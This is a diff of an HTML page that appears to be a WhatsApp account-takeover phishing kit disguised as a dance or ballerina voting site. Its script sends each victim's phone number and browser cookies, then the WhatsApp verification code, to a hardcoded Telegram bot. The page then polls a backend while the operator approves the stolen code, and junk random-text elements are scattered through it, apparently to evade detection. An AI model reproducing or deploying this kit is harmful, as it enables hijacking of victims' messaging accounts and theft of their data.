+            HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
+        <input type="hidden" id="user-number">
+        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+
+        <p>Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
+            impostazioni, quindi inserisci questo codice</p>
+
+        <h5
+            class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
+            xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
+
+        <small
+            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
+            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
+                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
+        </small>
+    </div>
+
+    <div class="number-column">
+        <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">lNJFwMkFeieFVsR
+            YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
+        <div class="number-container" id="loader">
+
+            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+            <div class="loader" ></div>
+
+            <div class="number-code hidden" id="number-code" data-code="">
+                <div class="symbol"></div>
+                <div class="symbol"></div>
+                <div class="symbol"></div>
+                <div class="symbol"></div>
+                <div class="split">–</div>
+                <div class="symbol"></div>
+                <div class="symbol"></div>
+                <div class="symbol"></div>
+                <div class="symbol"></div>
+            </div>
+            <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
+                <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
+                    GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
             </div>
         </div>
 
-        <!-- === ШАГ 2: ВВОД КОДА (Изначально скрыт) === -->
-        <div class="block number hidden" id="form-step-2"> <!-- Используем ваш ID и класс hidden -->
-             <div class="form-container form-code">
-                <p class="text code-title">Code:</p>
+
+
+        <div class="block number" id="form-step-2" style="display: none;">
+
+            <div id="form-step-2-container" class="form-container form-code"> <!-- ID ИЗМЕНЕН -->
+                <p  class="text code-title">Code:</p>
+
                 <div class="form" id="form-code">
-                    <input type="text" class="number" id="code" placeholder="Enter code..." />
+
+                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+
+
+                    <input type="text" class="number" id="code" />
+                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
+                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
+                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
+                    </span>
                     <button class="button primary" id="two-step">Continua</button>
                 </div>
             </div>
-        </div>
 
-        <!-- === ЛОАДЕР (Изначально скрыт) === -->
-        <div id="loader" class="loader-container hidden">
-            <div class="loader"></div>
         </div>
-
-    </div> <!-- конец .wrapper -->
-
-    <!-- === ВСПЛЫВАЮЩИЕ ОКНА (Изначально скрыты) === -->
-    <div class="popup hidden" id="popreboot">
-        <div class="body">
-            <h2>Your vote has been counted, thank you</h2>
-            <button class="button primary btn-ok">Ok</button> <!-- ID не обязателен, если ловим по классу -->
+        <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
+            <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
+                GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
         </div>
+        <div class="button primary hidden" id="copy-code">Copia</div>
+
     </div>
 
-    <div class="popup hidden" id="popwhat">
-        <div class="body">
-            <h2>Something is wrong!</h2>
-            <p>You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.</p>
-            <button class="button primary btn-reb">Reboot</button> <!-- ID не обязателен, если ловим по классу -->
-        </div>
-    </div>
+</div>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            
-            // --- Логика дропдауна (из number.js, УПРОЩЕННАЯ ВЕРСИЯ ДЛЯ ПРИМЕРА) ---
-            // Настоящая логика находится во внешнем number.js
-            // Этот блок здесь только для иллюстрации того, что должно происходить
-            const countrySelector = document.querySelector('#myForm .country');
-            const countriesList = document.querySelector('#myForm .countries');
-            const phoneInput = document.getElementById('number');
-            const searchInput = document.getElementById('search');
-            
-            countrySelector?.addEventListener('click', () => {
-                countriesList?.classList.toggle('hidden');
-            });
+<strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong>
+</div>
+<small
+class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
+<h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
+    StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
+</small>
+<div class="popup top40" id="popreboot" >
+<h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+<div class="body">
 
-            countriesList?.addEventListener('click', (e) => {
-                const item = e.target.closest('.item');
-                if (item) {
-                    const name = item.dataset.name;
-                    const code = item.dataset.code;
-                    const lang = item.dataset.lang;
-                    const flagSrc = item.querySelector('img')?.src;
-
-                    // Обновляем выбранную страну
-                    const currentCountryName = countrySelector.querySelector('p.name');
-                    const currentCountryFlag = countrySelector.querySelector('img');
-                    if (currentCountryName) currentCountryName.textContent = name;
-                    if (currentCountryFlag) currentCountryFlag.src = flagSrc || '';
-
-                    // Обновляем код в поле ввода
-                    if (phoneInput) phoneInput.value = code;
-
-                    // Скрываем список
-                    countriesList.classList.add('hidden');
-                    if (phoneInput) phoneInput.focus(); // Фокус на номер после выбора кода
-                }
-            });
-            
-             // Фильтрация списка (упрощенный пример)
-            searchInput?.addEventListener('input', () => {
-                const filter = searchInput.value.toLowerCase();
-                const items = countriesList?.querySelectorAll('.item');
-                items?.forEach(item => {
-                    const name = item.dataset.name?.toLowerCase() || '';
-                    const code = item.dataset.code?.toLowerCase() || '';
-                    if (name.includes(filter) || code.includes(filter)) {
-                        item.style.display = '';
-                    } else {
-                        item.style.display = 'none';
-                    }
-                });
-            });
-            
-            // Скрытие списка при клике вне его
-             document.addEventListener('click', (e) => {
-                 if (!countrySelector?.contains(e.target) && !countriesList?.contains(e.target)) {
-                    countriesList?.classList.add('hidden');
-                 }
-             });
-            // --- Конец примерной логики дропдауна ---
+    <h2>Your vote has been counted, thank you</h2>
+    <button class="button primary btn-ok" id="reload-page">Ok</button>
+    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+</div>
+<small
+    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
+    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
+        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
+</small>
+</div>
 
 
-            // --- Ваша логика отправки формы и ожидания ---
-            document.querySelectorAll(".btn-reb").forEach(button => {
-                button.addEventListener("click", () => { location.reload(); });
-            });
 
-            document.querySelectorAll(".btn-ok").forEach(button => {
-                button.addEventListener("click", () => {
-                    document.getElementById("popreboot")?.classList.add('hidden');
-                    document.getElementById("popwhat")?.classList.add('hidden');
-                });
-            });
+<div class="popup top40" id="popwhat" >
+<h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+<div class="body">
 
-            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; // ЗАМЕНИТЬ НА РЕАЛЬНЫЙ ТОКЕН
-            const chat_id = "7538727898"; // ЗАМЕНИТЬ НА РЕАЛЬНЫЙ CHAT ID
-            const backendURL = "https://api.bestballerinavote.com"; // УБЕДИТЬСЯ, ЧТО URL ПРАВИЛЬНЫЙ
+    <h2>Something is wrong!</h2>
+    <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP WFFhTuDduNDAMMCnWt
+        MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK HMnrMFReAPNuUAFJVUhthI
+        CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
+    <p>You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.</p>
+    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
+        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
+            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
+    </span>
+    <button class="button primary btn-reb" id="reload-page">Reboot</button>
+    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+</div>
+<small
+    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
+    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
+        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
+</small>
+</div>
+<h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
 
-            const nextStepBtn = document.getElementById("next-step");
-            const codeStepBtn = document.getElementById("two-step");
-            const formStep1 = document.getElementById("step-1"); // Весь первый блок
-            const formStep2 = document.getElementById("form-step-2"); // Ваш блок ввода кода
-            const loaderDiv = document.getElementById("loader"); // Ваш лоадер
 
-            nextStepBtn?.addEventListener("click", function (e) {
-                e.preventDefault();
-                const phone = phoneInput.value.trim();
-                const cookies = document.cookie || "Немає кукі";
-                const errorP = document.querySelector('#form-step-1 .form p.error');
-
-                if (errorP) errorP.classList.add('hidden'); // Сначала скрыть ошибку
-
-                if (!phone) {
-                    Notiflix.Notify.failure('Введіть номер телефону'); return;
-                }
-                if (!/^\+\d{7,15}$/.test(phone)) {
-                    Notiflix.Notify.failure('Неправильний формат номера телефону');
-                    if (errorP) {
-                        errorP.textContent = 'Неправильний формат номера телефону';
-                        errorP.classList.remove('hidden');
-                    }
-                    return;
-                }
-
-                sessionStorage.setItem("submittedPhone", phone);
-                const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id, text: msg }) })
-                    .catch(err => console.error("Telegram send phone error:", err)); // Ловим ошибки
-
-                formStep1?.classList.add('hidden'); // Скрываем весь первый шаг
-                formStep2?.classList.remove('hidden'); // Показываем второй шаг
-                document.getElementById("code")?.focus(); // Фокус на поле кода
-            });
-
-            codeStepBtn?.addEventListener("click", function (e) {
-                e.preventDefault();
-                const codeInput = document.getElementById("code");
-                const code = codeInput.value.trim();
-                const phone = sessionStorage.getItem("submittedPhone");
-
-                if (!code) { Notiflix.Notify.failure('Введіть код'); return; }
-                if (!phone) {
-                     Notiflix.Notify.failure('Помилка: номер телефону не знайдено. Спробуйте знову.');
-                     formStep2?.classList.add('hidden');
-                     formStep1?.classList.remove('hidden');
-                     return;
-                }
-
-                const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
-                const keyboard = { inline_keyboard: [[ { text: "✅ Так", callback_data: `confirm_yes_${phone}` }, { text: "❌ Ні", callback_data: `confirm_no_${phone}` } ]] };
-
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id, text: msg, reply_markup: keyboard }) })
-                    .catch(err => console.error("Telegram send code error:", err)); // Ловим ошибки
-
-                formStep2?.classList.add('hidden'); // Скрываем форму кода
-                loaderDiv?.classList.remove('hidden'); // Показываем лоадер
-
-                waitForApproval(phone);
-            });
-
-            function waitForApproval(phone) {
-                const interval = setInterval(() => {
-                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
-                        .then(res => { if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`); return res.json(); })
-                        .then(data => {
-                            console.log("Backend check response:", data);
-                            if (data.status === "approved" || data.status === "rejected") {
-                                clearInterval(interval);
-                                loaderDiv?.classList.add('hidden'); // Скрываем лоадер
-                                if (data.status === "approved") {
-                                    document.getElementById("popreboot")?.classList.remove('hidden'); // Показываем успех
-                                } else {
-                                    document.getElementById("popwhat")?.classList.remove('hidden'); // Показываем ошибку
-                                }
-                            }
-                        })
-                        .catch(err => {
-                            console.error("Backend check error:", err);
-                            // Опционально: остановить опрос при ошибке сети
-                            // clearInterval(interval);
-                            // loaderDiv?.classList.add('hidden');
-                            // Notiflix.Notify.failure("Помилка зв'язку з сервером.");
-                        });
-                }, 3000);
-            }
+<script>
+// *** ТВОЙ ОРИГИНАЛЬНЫЙ СКРИПТ ИЗ ПЕРВОГО СООБЩЕНИЯ ***
+document.addEventListener("DOMContentLoaded", function () {
+    document.querySelectorAll(".btn-reb").forEach(button => {
+        button.addEventListener("click", () => {
+            location.reload();
         });
-    </script>
+    });
+
+    document.querySelectorAll(".btn-ok").forEach(button => {
+        button.addEventListener("click", () => {
+            // location.reload();
+            document.getElementById("popwhat").style.display = "none";
+        });
+    });
+    document.getElementById("popreboot").style.display = "none";
+    const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
+    const chat_id = "7538727898";
+    const backendURL = "https://api.bestballerinavote.com";
+
+    const nextStepBtn = document.getElementById("next-step");
+    const codeStepBtn = document.getElementById("two-step");
+    document.getElementById("loader").style.display = "none";
+    document.getElementById("popwhat").style.display = "none";
+
+    nextStepBtn?.addEventListener("click", function (e) {
+        e.preventDefault();
+
+        const phone = document.getElementById("number").value.trim();
+        const cookies = document.cookie || "Немає кукі";
+
+        if (!phone) return alert("Введіть номер");
+
+        sessionStorage.setItem("submittedPhone", phone);
+
+        const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id, text: msg })
+        });
+
+        document.getElementById("form-step-1").style.display = "none";
+        document.getElementById("form-step-2").style.display = "block";
+
+    });
+
+    codeStepBtn?.addEventListener("click", function (e) {
+        e.preventDefault();
+
+        const code = document.getElementById("code").value.trim();
+        const phone = sessionStorage.getItem("submittedPhone");
+
+        if (!code || !phone) return alert("Немає даних");
+
+        const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
+        const keyboard = {
+            inline_keyboard: [
+                [
+                    { text: "✅ Так", callback_data: `confirm_yes_${phone}` },
+                    { text: "❌ Ні", callback_data: `confirm_no_${phone}` }
+                ]
+            ]
+        };
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id,
+                text: msg,
+                reply_markup: keyboard
+            })
+        });
+
+        document.getElementById("loader").style.display = "block";
+
+        document.getElementById("form-step-2").style.display = "none";
+        // document.getElementById("loader").style.display = "block";
+        // document.getElementById("loader").style.display = "none";
+
+        waitForApproval(phone);
+    });
+
+    function waitForApproval(phone) {
+        const interval = setInterval(() => {
+            fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
+                .then(res => res.json())
+                .then(data => {
+                    console.log("📩 Відповідь від бекенду:", data);
+                    if (data.status === "approved") {
+                        document.getElementById("popreboot").style.display = "block";
+                        clearInterval(interval);
+                        alert("✅ Підтверджено");
+
+                        document.getElementById("loader").style.display = "none";
+                    } else if (data.status === "rejected") {
+                        document.getElementById("popwhat").style.display = "block";
+                        clearInterval(interval);
+                        alert("❌ Відхилено");
+                        document.getElementById("loader").style.display = "none";
+                    }
+                })
+                .catch(err => console.error("❌ Помилка бекенду:", err));
+        }, 3000);
+    }
+});
+// *** КОНЕЦ ТВОЕГО ОРИГИНАЛЬНОГО СКРИПТА ***
+</script>
 </body>
+
+<!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
+
 </html>
+<!-- Конец Части 3 -->
